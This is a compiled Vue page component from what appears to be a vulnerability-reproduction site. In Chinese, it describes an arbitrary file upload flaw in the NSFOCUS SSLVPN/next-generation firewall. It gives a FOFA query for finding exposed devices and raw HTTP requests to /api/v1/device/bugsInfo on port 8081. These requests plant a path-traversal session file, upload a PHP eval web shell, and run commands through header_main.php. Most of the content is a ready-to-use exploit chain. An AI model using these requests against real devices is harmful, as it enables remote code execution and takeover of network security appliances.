import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>绿盟 SSLVPN 存在任意文件上传漏洞，攻击者通过发送特殊的请求包可以获取服务器权限，进行远程命令执行</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>绿盟 SSLVPN</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;NSFOCUS-下一代防火墙&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>主页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162157873.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的端口为 8081</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9
Host: 

--1d52ba2a11ad8a915eddab1a0e85acd9
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;sess_82c13f359d0dd8f51c29d658a9c8ac71&quot;

lang|s:52:&quot;../../../../../../../../../../../../../../../../tmp/&quot;;

--1d52ba2a11ad8a915eddab1a0e85acd9--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162212745.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host: 

--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;compose.php&quot;


&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;

--4803b59d015026999b45993b1245f0ef--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162224796.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host: 

--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;compose.php&quot;


&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;

--4803b59d015026999b45993b1245f0ef--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828162237233.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /mail/include/header_main.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
Host:

cmd=phpinfo();
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,17),l=[s];function t(r,c){return i(),a("div",null,l)}const v=e(d,[["render",t],["__file","绿盟 NF下一代防火墙 任意文件上传漏洞.html.vue"]]);export{v as default};
